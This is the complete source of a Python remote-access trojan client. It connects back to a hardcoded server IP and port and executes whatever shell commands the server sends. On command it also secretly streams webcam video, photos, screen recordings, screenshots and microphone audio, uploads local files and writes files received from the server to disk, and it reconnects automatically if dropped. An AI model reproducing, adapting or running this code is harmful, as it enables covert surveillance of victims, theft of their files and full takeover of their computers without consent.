#!/usr/bin/python
from __future__ import division
import time
import socket
import os
import subprocess
import sys
import getpass
import time
import pyaudio
import pyautogui 
import numpy as np
from PIL import Image
from io import BytesIO
import re
if 'linux' in sys.platform:
  import pygame.camera
  import pygame.image
import pyttsx
import cv2
import numpy
from threading import Thread
if 'win' in sys.platform:
  import win32com.client

BYTES=20000
HOST='172.31.77.183'
PORT=44455
CURRENT_PORT=44455
  
def fetch_server_IP_PORT():
  global PORT
  global HOST
  return (HOST,PORT)

def connect_host_port(Host,Port):
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  while True:
    try:
      s.connect((Host,Port))
      break
    except:
      #print "FIND : ",Host,Port
      time.sleep(1)
      continue
  #print "GOT:"
  return s

def callback(in_data, frame_count, time_info, status):
  global Rsocket
  #print "Send : ",len(in_data)
  Rsocket.sendall(in_data)
  return (None, pyaudio.paContinue)

def fetch_till_newline(s):
  d=s.recv(1)
  total=''
  while d!='\n':
    total+=d
    d=s.recv(1)
  return total

def recvall(con,cmd,sz):
  global BYTES
  part=''
  f=open(cmd,'wb')
  l=con.recv(BYTES)
  sub=0
  sz=int(sz)
  while (l):
    sub+=len(l)
    f.write(l)
    if sub>=sz:
      break
    l=con.recv(BYTES)
  f.close()

def SpeakThread(cmd):
  #print "Speak : "
  engine = pyttsx.init()
  engine.setProperty('rate', 90)
  engine.say(str(cmd))
  engine.runAndWait()
  del engine

def CaptureVideoThread(data):

  global HOST
  global CURRENT_PORT
  s=connect_host_port(HOST,CURRENT_PORT+1)

  cmd=data.decode("utf-8")
  cmd=re.sub(r"capturevideo *","",cmd)
  if(len(cmd)>0):
    vect=cmd.split(' ')
  else:
    vect=[]
  #print vect,len(vect)
  cap = cv2.VideoCapture(0)
  gray=0
  if(len(vect)==1 and vect[0][0]=='1'):
    #print "hereee"
    gray=1
  if(len(vect)==2 or len(vect)==3):
    #print "INSIDEE : ",vect[0],vect[1]
    cap.set(cv2.CAP_PROP_FRAME_WIDTH,float(vect[0]))
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT,float(vect[1]))
    if(len(vect)==3 and vect[2][0]=='1'):
      gray=1
  #print "1"
  widthf=cap.get(cv2.CAP_PROP_FRAME_WIDTH)
  heightf=cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
  width=int(widthf)
  height=int(heightf)
  #print "width height",width,height
  s.sendall(str(width)+' '+str(height)+'\n')
  while(True):
    try:
      ret, frame = cap.read()
      if gray==1:
        frame=cv2.cvtColor(frame,cv2.COLOR_BGR2GRAY)
      encode_param=[int(cv2.IMWRITE_JPEG_QUALITY),90]
      result, imgencode = cv2.imencode('.jpg', frame, encode_param)
      img_np = numpy.array(imgencode)
      #print "MATCHEE : ",img_np.shape
      data = img_np.tostring()
      #print "LEN : ",len(data)
      s.sendall(str(len(data))+'\n')
      s.sendall(data)
      data = s.recv(1)
      if '0' in data:
        break
    except:
        break
  cap.release()
  s.close()
  #print "closed.."  

def ScreenRecordThread(data):
  global HOST
  global CURRENT_PORT
  
  s=connect_host_port(HOST,CURRENT_PORT+2)

  cmd=data.decode("utf-8")
  cmd=re.sub(r"screenrecord *","",cmd)
  if(len(cmd)>0):
    vect=cmd.split(' ')
  else:
    vect=[]
  #print "VECT : ",len(vect)
  im = pyautogui.screenshot()
  x=0
  y=0
  width,height=im.size
  gray=0
  res=1
  if(len(vect)==4 or len(vect)==5):
    x=int(vect[0])
    y=int(vect[1])
    width=int(vect[2])
    height=int(vect[3])
  #print "x y width height",x,y,width,height
  w=0
  h=0
  if(len(vect)==1):
    if(vect[0][0]=='c'):
      gray=1
    if(vect[0][1]=='r'):
      try:
        res=float(vect[0][2:])/100
      except:
        res=0.5
      w=int(res*float(width))
      h=int(res*float(height))
      #print "resize : ",width,"to",w,height,"to",h
      s.sendall(str(w)+' '+str(h)+'\n')
    else:
      s.sendall(str(width)+' '+str(height)+'\n')
  else:
    if(len(vect)==5):
      if(vect[4][0]=='c'):
        gray=1
      if(vect[4][1]=='r'):
        try:
          res=float(vect[4][2:])/100
        except:
          res=0.5
        w=int(res*float(width))
        h=int(res*float(height))
        s.sendall(str(w)+' '+str(h)+'\n')
      else:
        s.sendall(str(width)+' '+str(height)+'\n')
    else:
      s.sendall(str(width)+' '+str(height)+'\n')
              
  while(True):
    im = pyautogui.screenshot(region=(x,y,width,height))
    if(res!=1):
      #print "Resie ::  "
      im=im.resize((w,h),Image.ANTIALIAS)
    if(gray==1):
      #print "GRAYYYYY"
      im=im.convert('L')
    img_np = np.array(im)        
    if gray==0:
      a,b,c=img_np.shape
      s.sendall(str(a)+' '+str(b)+' '+str(c)+'\n')
    else:
      a,b=img_np.shape
      s.sendall(str(a)+' '+str(b)+'\n')
    data=img_np.tostring()
    #print "MATCH : ",img_np.shape
    s.sendall(str(len(data))+'\n')
    s.sendall(data)
    data = s.recv(1)
    if '0' in data:
      break
  #print "Closedd"
  s.close()

def MicrophoneThread():
  global HOST
  global CURRENT_PORT
  global Rsocket
  Rsocket=connect_host_port(HOST,CURRENT_PORT+3)
  FORMAT = pyaudio.paInt16
  CHANNELS = 1
  RATE = 44100
  CHUNK = 4096 
  audio = pyaudio.PyAudio()
  # start Recording
  stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK, stream_callback=callback)
  # stream.start_stream()
  #print "waiting to recv"
  data=Rsocket.recv(BYTES)
  # stop Recording
  stream.stop_stream()
  stream.close()
  audio.terminate()
  Rsocket.sendall('finished\n')
  Rsocket.close()
  #print "Closed"
          
def ScreenShotThread():

  global HOST
  global CURRENT_PORT
  s=connect_host_port(HOST,CURRENT_PORT+4)
  
  d=s.recv(1)
  total=''
  while d!='\n':
    total+=d
    d=s.recv(1)
  total=int(total)
  for i in range(0,total):
    im = pyautogui.screenshot()
    fd = BytesIO()
    im.save(fd, "png")
    s.sendall(str(len(fd.getvalue()))+'\n')
    s.sendall(fd.getvalue())
    data=s.recv(1)
  s.close()
  #print "CLosedd"
  
def CapturepicThread():

  global HOST
  global CURRENT_PORT
  s=connect_host_port(HOST,CURRENT_PORT+5)

  d=s.recv(1)
  total=''
  while d!='\n':
    total+=d
    d=s.recv(1)
  total=int(total)
  for i in range(0,total):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    encode_param=[int(cv2.IMWRITE_JPEG_QUALITY),90]
    result, imgencode = cv2.imencode('.jpg', frame, encode_param)
    Data = numpy.array(imgencode)
    data = Data.tostring()
    s.sendall(str(len(data))+'\n')
    s.sendall(data)
    data = s.recv(1)
  s.close()
  #print "Closeddd"

def CatcopyThread(data):

  global HOST
  global CURRENT_PORT
  s=connect_host_port(HOST,CURRENT_PORT+6)

  dest=data.decode("utf-8")
  
  dest=re.sub(r"catcopy *","",dest)
  
  files = []
  if(dest=='*'):
    for (dirpath, dirnames, filenames) in os.walk('.'):
      files.extend(filenames)
      break
  else:
    files.append(dest)
  
  s.sendall(str(len(files))+'\n')
  for i in range(0,len(files)):
    if os.path.isfile(files[i]):
      total=str(os.path.getsize(files[i]))  
    else:
      total='0'
    #print "send size",total
    s.sendall(str(total)+'\n')
    if(int(total)==0):
      s.recv(1)
      continue
    s.sendall(str(len(files[i]))+'\n')  
    s.sendall(files[i])
    f=open(files[i],'rb')
    l=f.read(BYTES)
    while (l):
      s.send(l)
      l=f.read(BYTES)
    f.close()
    #print "sentt"
    s.recv(1)
  s.close()
  #print "Closedd"
  
def CatsendThread(data):

  global HOST
  global CURRENT_PORT
  s=connect_host_port(HOST,CURRENT_PORT+7)

  cmd=data.decode("utf-8")
  number=int(fetch_till_newline(s))
  #print "NUMBER : ",number
  for i in range(0,number):
    sz=int(fetch_till_newline(s))
    #print "sz : ",sz
    if(sz>0):
      f_name_sz=int(fetch_till_newline(s))
      #print "f_name_sz : ",f_name_sz
      f_name=''
      while True:
        if len(f_name)==f_name_sz:
          break
        f_name+=s.recv(1)
      recvall(s,f_name,sz)
      s.sendall('1')
    else:
      s.sendall('1')
  s.close()
  #print "Closeddd"
   
def create_socket():
  try:
    #print "Connecting to server.."
    global HOST
    global PORT
    global BYTES
    global s 
    global CURRENT_PORT
    HOST,PORT=fetch_server_IP_PORT()
    PORT=int(PORT)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
      try:
        s.connect((HOST,PORT))
        break
      except:
        time.sleep(1)
        continue
    CURRENT_PORT=s.getsockname()[1]
    while True:
      try:
        data=s.recv(BYTES)
        #print "recvd",data 
        if 'dieclient' in data.decode("utf-8"):
          sys.exit(1)
        elif 'catcopy' in data.decode("utf-8"):
          CCthread=Thread(target=CatcopyThread,args=(data,))
          CCthread.start()
        elif 'catsend' in data.decode("utf-8"):
          CSthread=Thread(target=CatsendThread,args=(data,))
          CSthread.start()
        elif 'serverquit' in data.decode("utf-8"):
          s.close()
          time.sleep(10)
          create_socket()
        elif data.decode("utf-8")=='$#$':
          s.send('$#$')
        elif data.decode("utf-8")=='cwd':
          #print "CWD"
          output=str(os.getcwd())+"> "
          s.sendall(str(len(output))+"\n")
          s.sendall(output) 
        elif data[:2].decode("utf-8")=='cd':
          if os.path.isdir(data[3:]):
            os.chdir(data[3:])
            output_str=str(os.getcwd())+"> "
            s.sendall(str(len(output_str))+"\n")
            s.sendall(output_str)
          else:
            output_str="No such file or directory\n"+str(os.getcwd())+"> "
            s.sendall(str(len(output_str))+"\n")
            s.sendall(output_str)
        elif 'capturevideo' in data.decode("utf-8"):
          Vthread=Thread(target=CaptureVideoThread,args=(data,))
          Vthread.start()
        elif 'capturepic' in data.decode("utf-8"):
          #print "hiii"
          Cpicthread=Thread(target=CapturepicThread)
          Cpicthread.start()
        elif 'screenshot' in data.decode("utf-8"):
          SSthread=Thread(target=ScreenShotThread)
          SSthread.start()
        elif 'screenrecord' in data.decode("utf-8"):
          Sthread=Thread(target=ScreenRecordThread,args=(data,))
          Sthread.start()
        elif 'microphone' in data.decode("utf-8"):
          Mthread=Thread(target=MicrophoneThread)
          Mthread.start()
        elif data.decode("utf-8")=='username':
          s.sendall(str(getpass.getuser()))
        elif data[:].decode("utf-8")=='quit':
          s.close()
          create_socket()
        elif 'speak' in data.decode("utf-8"):
          cmd = data.decode("utf-8")
          cmd=re.sub(r"speak *","",cmd)
 
          engine = pyttsx.init()
          engine.setProperty('rate', 90)
          engine.say('')
          engine.runAndWait()
          del engine

          Spkthread=Thread(target=SpeakThread,args=(cmd,))
          Spkthread.start()
        else:
          if len(data)>0:
            cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
            output=cmd.stdout.read()+cmd.stderr.read()
            output_str=output+str(os.getcwd())+"> "
            s.sendall(str(len(output_str))+"\n")
            s.sendall(output_str)
          else:
            raise
      except Exception,e:
        #print "recv or send error : ",e
        raise
  except Exception,e1:
    #print "recreating socketttt",e1
    s.close()
    create_socket()
create_socket()
